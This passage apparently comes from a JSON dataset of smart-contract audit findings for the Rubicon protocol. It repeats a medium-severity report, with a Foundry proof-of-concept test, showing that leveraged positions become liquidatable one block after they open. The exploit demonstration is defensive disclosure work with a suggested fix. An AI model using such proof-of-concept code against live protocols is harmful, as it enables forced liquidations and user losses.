buy_gem;\n        info.recipient = recipient;\n        info.owner = owner;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n\n        emit LogItemUpdate(id);\n\n\n        /// emit LogMake(\n        ///     bytes32(id),\n        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),\n        ///     msg.sender,\n        ///     pay_gem,\n        ///     buy_gem,\n        ///     uint128(pay_amt),\n        ///     uint128(buy_amt),\n        ///     uint64(block.timestamp)\n        /// );\n\n\n        emit emitOffer(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt)\n        );\n    }\n```\n\nas you see it is applied in the other offer function as well at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the check condition:\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\nto `offer` function that called by `make` function\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1180,
      "page_start": null,
      "heading": "1180. Some positions will get liquidated immediately",
      "heading_cleaned": "Some positions will get liquidated immediately",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L316-L317\n\n\n# Vulnerability details\n\n## Description\nWhen opening a position the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n```solidity\nFile: utilities/poolsUtility/Position.sol\n\n306:    function _maxBorrow(\n307:        address _bathToken\n308:    ) internal view returns (uint256 _max) {\n309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n310:            .getAccountLiquidity(address(this));\n311:\n312:        require(_err == 0, \"_maxBorrow: ERROR\");\n313:        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\n314:        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n315:\n316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n317:        _max = (_liq.mul(10 ** 18)).div(_price);\n318:        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n319:    }\n```\n\nThe danger here is that the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence the block after the loan is taken it will be under water.\n\n## Impact\nPositions opened will in the block after they are created become under water and possible to liquidate.\n\nThis only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max, hence medium.\n\nA user will have to know about this behavior in Position and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.\n\n## Proof of Concept\nPoC test, `PositionTest.t.sol`:\n```\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/compound-v2-fork/CToken.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/periphery/DummyPriceOracle.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"../../contracts/BathHouseV2.sol\";\nimport \"../../contracts/utilities/poolsUtility/Position.sol\";\nimport \"../../contracts/utilities/poolsUtility/PoolsUtility.sol\";\n\nimport \"forge-std/Test.sol\";\n\ncontract PositionTest is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  // core contracts\n  RubiconMarket market;\n  Comptroller comptroller;\n  BathHouseV2 bathHouse;\n\n  DummyPriceOracle oracle;\n\n  // test tokens\n  TokenWithFaucet TEST;\n  TokenWithFaucet TUSDC;\n\n  CErc20 cTEST;\n  CErc20 cTUSDC;\n\n  address alice = 0x0000000000000000000000000000000000000123;\n  address bob = 0x0000000000000000000000000000000000000124;\n\n  function setUp() public {\n    owner = msg.sender;\n    // deploy Comptroller instance\n    comptroller = new Comptroller();\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    TEST = new TokenWithFaucet(address(this), \"Test\", \"TEST\", 18);\n    TUSDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"TUSDC\", 6);\n    vm.label(address(TEST),\"TEST\");\n    vm.label(address(TUSDC),\"TUSDC\");\n\n    // baseRate = 0.3, multiplierPerYear = 0.02\n    WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);\n    CErc20Delegate bathTokenImplementation = new CErc20Delegate();\n\n    bathHouse = new BathHouseV2();\n    bathHouse.initialize(address(comptroller),address(this));\n    bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), \"\");\n    bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), \"\");\n\n    cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));\n    cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));\n\n    // 1:1 for simplicity\n    oracle = new DummyPriceOracle();\n    oracle.addCtoken(cTUSDC,1e30);\n    oracle.addCtoken(cTEST,1e18);\n\n    comptroller._supportMarket(cTEST);\n    comptroller._supportMarket(cTUSDC);\n    comptroller._setPriceOracle(oracle);\n    comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet\n    comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet\n    comptroller._setCollateralFactor(cTEST,0.7e18);\n    comptroller._setCollateralFactor(cTUSDC,0.7e18);\n\n    TEST.mint(address(bob),100e18);\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),50e18);\n    cTEST.mint(50e18);\n    vm.stopPrank();\n\n    // add some $$$ to the Market\n    TEST.faucet();\n    TUSDC.faucet();\n    TEST.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n\n    market.offer(100e6, TUSDC, 100e18, TEST);\n  }\n\n  function test_LiquidatePositionAfterCreation() public {\n    PoolsUtility pools = new PoolsUtility();\n    pools.initialize(address(oracle),address(market),address(bathHouse));\n\n    vm.prank(alice);\n    pools.createPosition();\n\n    address[] memory positions = pools.getPositions(alice);\n    Position position = Position(positions[0]);\n\n    uint256 amount = 10e6;\n    TUSDC.mint(alice,amount);\n    vm.startPrank(alice);\n    TUSDC.approve(address(position),amount);\n    position.sellAllAmountWithLeverage(\n        address(TUSDC),\n        address(TEST),\n        amount,\n        1e18\n    );\n    vm.stopPrank();\n\n    (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    // position under water\n    assertEq(0,shortfall);\n\n    // next block\n    vm.roll(block.number + 1);\n\n    // trigger interest calculation\n    uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));\n\n    (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    assertGt(shortfall,0);\n\n    // becomes liquidated\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),borrowBalance/2);\n    cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);\n    vm.stopPrank();\n  }\n}\n```\n\n`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.\n\nAdded a mint function in the `TokenWithFaucet`:\n```solidity\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n```\n\n## Tools Used\nmanual audit, forge\n\n## Recommended Mitigation Steps\nIntroduce a safety factor to scale the loans with that the user can provide when opening the position.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L316-L317\n\n\n# Vulnerability details\n\n## Description\nWhen opening a position the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n```solidity\nFile: utilities/poolsUtility/Position.sol\n\n306:    function _maxBorrow(\n307:        address _bathToken\n308:    ) internal view returns (uint256 _max) {\n309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n310:            .getAccountLiquidity(address(this));\n311:\n312:        require(_err == 0, \"_maxBorrow: ERROR\");\n313:        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\n314:        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n315:\n316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n317:        _max = (_liq.mul(10 ** 18)).div(_price);\n318:        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n319:    }\n```\n\nThe danger here is that the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence the block after the loan is taken it will be under water.\n\n## Impact\nPositions opened will in the block after they are created become under water and possible to liquidate.\n\nThis only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max, hence medium.\n\nA user will have to know about this behavior in Position and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.\n\n## Proof of Concept\nPoC test, `PositionTest.t.sol`:\n```\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/compound-v2-fork/CToken.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/periphery/DummyPriceOracle.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"../../contracts/BathHouseV2.sol\";\nimport \"../../contracts/utilities/poolsUtility/Position.sol\";\nimport \"../../contracts/utilities/poolsUtility/PoolsUtility.sol\";\n\nimport \"forge-std/Test.sol\";\n\ncontract PositionTest is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  // core contracts\n  RubiconMarket market;\n  Comptroller comptroller;\n  BathHouseV2 bathHouse;\n\n  DummyPriceOracle oracle;\n\n  // test tokens\n  TokenWithFaucet TEST;\n  TokenWithFaucet TUSDC;\n\n  CErc20 cTEST;\n  CErc20 cTUSDC;\n\n  address alice = 0x0000000000000000000000000000000000000123;\n  address bob = 0x0000000000000000000000000000000000000124;\n\n  function setUp() public {\n    owner = msg.sender;\n    // deploy Comptroller instance\n    comptroller = new Comptroller();\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    TEST = new TokenWithFaucet(address(this), \"Test\", \"TEST\", 18);\n    TUSDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"TUSDC\", 6);\n    vm.label(address(TEST),\"TEST\");\n    vm.label(address(TUSDC),\"TUSDC\");\n\n    // baseRate = 0.3, multiplierPerYear = 0.02\n    WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);\n    CErc20Delegate bathTokenImplementation = new CErc20Delegate();\n\n    bathHouse = new BathHouseV2();\n    bathHouse.initialize(address(comptroller),address(this));\n    bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), \"\");\n    bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), \"\");\n\n    cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));\n    cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));\n\n    // 1:1 for simplicity\n    oracle = new DummyPriceOracle();\n    oracle.addCtoken(cTUSDC,1e30);\n    oracle.addCtoken(cTEST,1e18);\n\n    comptroller._supportMarket(cTEST);\n    comptroller._supportMarket(cTUSDC);\n    comptroller._setPriceOracle(oracle);\n    comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet\n    comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet\n    comptroller._setCollateralFactor(cTEST,0.7e18);\n    comptroller._setCollateralFactor(cTUSDC,0.7e18);\n\n    TEST.mint(address(bob),100e18);\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),50e18);\n    cTEST.mint(50e18);\n    vm.stopPrank();\n\n    // add some $$$ to the Market\n    TEST.faucet();\n    TUSDC.faucet();\n    TEST.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n\n    market.offer(100e6, TUSDC, 100e18, TEST);\n  }\n\n  function test_LiquidatePositionAfterCreation() public {\n    PoolsUtility pools = new PoolsUtility();\n    pools.initialize(address(oracle),address(market),address(bathHouse));\n\n    vm.prank(alice);\n    pools.createPosition();\n\n    address[] memory positions = pools.getPositions(alice);\n    Position position = Position(positions[0]);\n\n    uint256 amount = 10e6;\n    TUSDC.mint(alice,amount);\n    vm.startPrank(alice);\n    TUSDC.approve(address(position),amount);\n    position.sellAllAmountWithLeverage(\n        address(TUSDC),\n        address(TEST),\n        amount,\n        1e18\n    );\n    vm.stopPrank();\n\n    (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    // position under water\n    assertEq(0,shortfall);\n\n    // next block\n    vm.roll(block.number + 1);\n\n    // trigger interest calculation\n    uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));\n\n    (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    assertGt(shortfall,0);\n\n    // becomes liquidated\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),borrowBalance/2);\n    cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);\n    vm.stopPrank();\n  }\n}\n```\n\n`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.\n\nAdded a mint function in the `TokenWithFaucet`:\n```solidity\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n```\n\n## Tools Used\nmanual audit, forge\n\n## Recommended Mitigation Steps\nIntroduce a safety factor to scale the loans with that the user can provide when opening the position.",
      "description": "## Description\nWhen opening a position the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n```solidity\nFile: utilities/poolsUtility/Position.sol\n\n306:    function _maxBorrow(\n307:        address _bathToken\n308:    ) internal view returns (uint256 _max) {\n309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n310:            .getAccountLiquidity(address(this));\n311:\n312:        require(_err == 0, \"_maxBorrow: ERROR\");\n313:        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\n314:        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n315:\n316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n317:        _max = (_liq.mul(10 ** 18)).div(_price);\n318:        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n319:    }\n```\n\nThe danger here is that the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence the block after the loan is taken it will be under water.\n",
      "impact": "## Impact\nPositions opened will in the block after they are created become under water and possible to liquidate.\n\nThis only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max, hence medium.\n\nA user will have to know about this behavior in Position and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.\n",
      "mitigation": "## Recommended Mitigation Steps\nIntroduce a safety factor to scale the loans with that the user can provide when opening the position.\n",
      "poc": "## Proof of Concept\nPoC test, `PositionTest.t.sol`:\n```\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/compound-v2-fork/CToken.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/periphery/DummyPriceOracle.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"../../contracts/BathHouseV2.sol\";\nimport \"../../contracts/utilities/poolsUtility/Position.sol\";\nimport \"../../contracts/utilities/poolsUtility/PoolsUtility.sol\";\n\nimport \"forge-std/Test.sol\";\n\ncontract PositionTest is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  // core contracts\n  RubiconMarket market;\n  Comptroller comptroller;\n  BathHouseV2 bathHouse;\n\n  DummyPriceOracle oracle;\n\n  // test tokens\n  TokenWithFaucet TEST;\n  TokenWithFaucet TUSDC;\n\n  CErc20 cTEST;\n  CErc20 cTUSDC;\n\n  address alice = 0x0000000000000000000000000000000000000123;\n  address bob = 0x0000000000000000000000000000000000000124;\n\n  function setUp() public {\n    owner = msg.sender;\n    // deploy Comptroller instance\n    comptroller = new Comptroller();\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    TEST = new TokenWithFaucet(address(this), \"Test\", \"TEST\", 18);\n    TUSDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"TUSDC\", 6);\n    vm.label(address(TEST),\"TEST\");\n    vm.label(address(TUSDC),\"TUSDC\");\n\n    // baseRate = 0.3, multiplierPerYear = 0.02\n    WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);\n    CErc20Delegate bathTokenImplementation = new CErc20Delegate();\n\n    bathHouse = new BathHouseV2();\n    bathHouse.initialize(address(comptroller),address(this));\n    bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), \"\");\n    bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), \"\");\n\n    cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));\n    cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));\n\n    // 1:1 for simplicity\n    oracle = new DummyPriceOracle();\n    oracle.addCtoken(cTUSDC,1e30);\n    oracle.addCtoken(cTEST,1e18);\n\n    comptroller._supportMarket(cTEST);\n    comptroller._supportMarket(cTUSDC);\n    comptroller._setPriceOracle(oracle);\n    comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet\n    comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet\n    comptroller._setCollateralFactor(cTEST,0.7e18);\n    comptroller._setCollateralFactor(cTUSDC,0.7e18);\n\n    TEST.mint(address(bob),100e18);\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),50e18);\n    cTEST.mint(50e18);\n    vm.stopPrank();\n\n    // add some $$$ to the Market\n    TEST.faucet();\n    TUSDC.faucet();\n    TEST.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n\n    market.offer(100e6, TUSDC, 100e18, TEST);\n  }\n\n  function test_LiquidatePositionAfterCreation() public {\n    PoolsUtility pools = new PoolsUtility();\n    pools.initialize(address(oracle),address(market),address(bathHouse));\n\n    vm.prank(alice);\n    pools.createPosition();\n\n    address[] memory positions = pools.getPositions(alice);\n    Position position = Position(positions[0]);\n\n    uint256 amount = 10e6;\n    TUSDC.mint(alice,amount);\n    vm.startPrank(alice);\n    TUSDC.approve(address(position),amount);\n    position.sellAllAmountWithLeverage(\n        address(TUSDC),\n        address(TEST),\n        amount,\n        1e18\n    );\n    vm.stopPrank();\n\n    (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    // position under water\n    assertEq(0,shortfall);\n\n    // next block\n    vm.roll(block.number + 1);\n\n    // trigger interest calculation\n    uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));\n\n    (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    assertGt(shortfall,0);\n\n    // becomes liquidated\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),borrowBalance/2);\n    cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);\n    vm.stopPrank();\n  }\n}\n```\n\n`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.\n\nAdded a mint function in the `TokenWithFaucet`:\n```solidity\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L316-L317\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nmanual audit, forge\n",
      "sections": {
        "description": "## Description\nWhen opening a position the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n```solidity\nFile: utilities/poolsUtility/Position.sol\n\n306:    function _maxBorrow(\n307:        address _bathToken\n308:    ) internal view returns (uint256 _max) {\n309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n310:            .getAccountLiquidity(address(this));\n311:\n312:        require(_err == 0, \"_maxBorrow: ERROR\");\n313:        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\n314:        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n315:\n316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n317:        _max = (_liq.mul(10 ** 18)).div(_price);\n318:        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n319:    }\n```\n\nThe danger here is that the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence the block after the loan is taken it will be under water.\n",
        "impact": "## Impact\nPositions opened will in the block after they are created become under water and possible to liquidate.\n\nThis only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max, hence medium.\n\nA user will have to know about this behavior in Position and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.\n",
        "recommendation": "## Recommended Mitigation Steps\nIntroduce a safety factor to scale the loans with that the user can provide when opening the position.\n",
        "poc": "## Proof of Concept\nPoC test, `PositionTest.t.sol`:\n```\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/compound-v2-fork/CToken.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/periphery/DummyPriceOracle.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"../../contracts/BathHouseV2.sol\";\nimport \"../../contracts/utilities/poolsUtility/Position.sol\";\nimport \"../../contracts/utilities/poolsUtility/PoolsUtility.sol\";\n\nimport \"forge-std/Test.sol\";\n\ncontract PositionTest is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  // core contracts\n  RubiconMarket market;\n  Comptroller comptroller;\n  BathHouseV2 bathHouse;\n\n  DummyPriceOracle oracle;\n\n  // test tokens\n  TokenWithFaucet TEST;\n  TokenWithFaucet TUSDC;\n\n  CErc20 cTEST;\n  CErc20 cTUSDC;\n\n  address alice = 0x0000000000000000000000000000000000000123;\n  address bob = 0x0000000000000000000000000000000000000124;\n\n  function setUp() public {\n    owner = msg.sender;\n    // deploy Comptroller instance\n    comptroller = new Comptroller();\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    TEST = new TokenWithFaucet(address(this), \"Test\", \"TEST\", 18);\n    TUSDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"TUSDC\", 6);\n    vm.label(address(TEST),\"TEST\");\n    vm.label(address(TUSDC),\"TUSDC\");\n\n    // baseRate = 0.3, multiplierPerYear = 0.02\n    WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);\n    CErc20Delegate bathTokenImplementation = new CErc20Delegate();\n\n    bathHouse = new BathHouseV2();\n    bathHouse.initialize(address(comptroller),address(this));\n    bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), \"\");\n    bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), \"\");\n\n    cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));\n    cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));\n\n    // 1:1 for simplicity\n    oracle = new DummyPriceOracle();\n    oracle.addCtoken(cTUSDC,1e30);\n    oracle.addCtoken(cTEST,1e18);\n\n    comptroller._supportMarket(cTEST);\n    comptroller._supportMarket(cTUSDC);\n    comptroller._setPriceOracle(oracle);\n    comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet\n    comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet\n    comptroller._setCollateralFactor(cTEST,0.7e18);\n    comptroller._setCollateralFactor(cTUSDC,0.7e18);\n\n    TEST.mint(address(bob),100e18);\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),50e18);\n    cTEST.mint(50e18);\n    vm.stopPrank();\n\n    // add some $$$ to the Market\n    TEST.faucet();\n    TUSDC.faucet();\n    TEST.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n\n    market.offer(100e6, TUSDC, 100e18, TEST);\n  }\n\n  function test_LiquidatePositionAfterCreation() public {\n    PoolsUtility pools = new PoolsUtility();\n    pools.initialize(address(oracle),address(market),address(bathHouse));\n\n    vm.prank(alice);\n    pools.createPosition();\n\n    address[] memory positions = pools.getPositions(alice);\n    Position position = Position(positions[0]);\n\n    uint256 amount = 10e6;\n    TUSDC.mint(alice,amount);\n    vm.startPrank(alice);\n    TUSDC.approve(address(position),amount);\n    position.sellAllAmountWithLeverage(\n        address(TUSDC),\n        address(TEST),\n        amount,\n        1e18\n    );\n    vm.stopPrank();\n\n    (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    // position under water\n    assertEq(0,shortfall);\n\n    // next block\n    vm.roll(block.number + 1);\n\n    // trigger interest calculation\n    uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));\n\n    (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    assertGt(shortfall,0);\n\n    // becomes liquidated\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),borrowBalance/2);\n    cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);\n    vm.stopPrank();\n  }\n}\n```\n\n`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.\n\nAdded a mint function in the `TokenWithFaucet`:\n```solidity\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L316-L317\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nmanual audit, forge\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L316-L317\n\n\n# Vulnerability details\n\n## Description\nWhen opening a position the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n```solidity\nFile: utilities/poolsUtility/Position.sol\n\n306:    function _maxBorrow(\n307:        address _bathToken\n308:    ) internal view returns (uint256 _max) {\n309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n310:            .getAccountLiquidity(address(this));\n311:\n312:        require(_err == 0, \"_maxBorrow: ERROR\");\n313:        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\n314:        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n315:\n316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n317:        _max = (_liq.mul(10 ** 18)).div(_price);\n318:        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n319:    }\n```\n\nThe danger here is that the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence the block after the loan is taken it will be under water.\n\n## Impact\nPositions opened will in the block after they are created become under water and possible to liquidate.\n\nThis only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max, hence medium.\n\nA user will have to know about this behavior in Position and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.\n\n## Proof of Concept\nPoC test, `PositionTest.t.sol`:\n```\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/compound-v2-fork/CToken.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/periphery/DummyPriceOracle.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"../../contracts/BathHouseV2.sol\";\nimport 